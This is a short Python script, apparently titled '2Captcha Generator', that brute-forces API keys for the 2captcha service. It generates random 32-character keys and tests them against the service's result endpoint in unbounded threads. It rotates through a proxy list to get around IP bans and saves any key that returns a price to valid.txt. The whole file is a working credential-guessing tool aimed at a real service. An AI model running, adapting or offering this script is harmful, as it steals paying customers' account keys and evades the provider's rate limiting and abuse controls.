import os, random, string, time, threading, itertools, httpx

valid, invalid, ratelimited, errors = 0, 0, 0, 0
proxies = itertools.cycle(open("./proxies.txt"))

def update_title():
    while True:
       os.system(f"title [2Captcha Generator] ~ Valid: {valid} ^| Invalid: {invalid} ^| Ratelimited: {ratelimited} ^| Errors: {errors}")
       time.sleep(0.4)

def bruter():
    global valid, invalid, ratelimited, errors
    key = "".join(random.choice(string.ascii_letters+string.digits) for _ in range(32))
    id = random.randint(1, 100000)
    url = f"http://2captcha.com/res.php?key={key}&action=get&id={id}"
    try:
        with httpx.Client(headers = {'accept-language': 'en','user-agent': 'Mozilla/5.0 (X11; CrOS x86_64 14588.123.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.72 Safari/537.36'}, proxies = f"http://{next(proxies)}") as client:
            res = client.get(url)
            if "ERROR_KEY_DOES_NOT_EXIST" in res.text:
                print(f"[\033[31mInvalid\033[0m] {key}")
                invalid += 1
            elif "IP_BANNED" in res.text:
                print(f"[\033[33mRatelimited\033[0m] {key}")
                ratelimited += 1
            elif "price" in res.text:
                print(f"[\033[32mValid\033[0m] {key}")
                with open('valid.txt','a+') as fp:
                    fp.write(f'{key}\n')
                valid += 1
            else:
                pass
    except Exception as e:
        print(f"[\033[31mError\033[0m] {e}")
        errors += 1

if __name__ == "__main__":
    os.system("cls & title [2Captcha Generator]")
    threading.Thread(target = update_title, daemon = True).start() 
    threads = []
    while True:
        t = threading.Thread(target=bruter)
        t.start()
        threads.append(t)
        for i in threads:
            i.join()
